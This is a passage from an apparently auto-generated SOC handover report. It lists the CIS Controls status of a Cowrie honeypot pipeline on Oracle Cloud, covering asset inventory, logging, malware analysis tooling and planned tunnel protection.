|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-28T23:04:11Z_
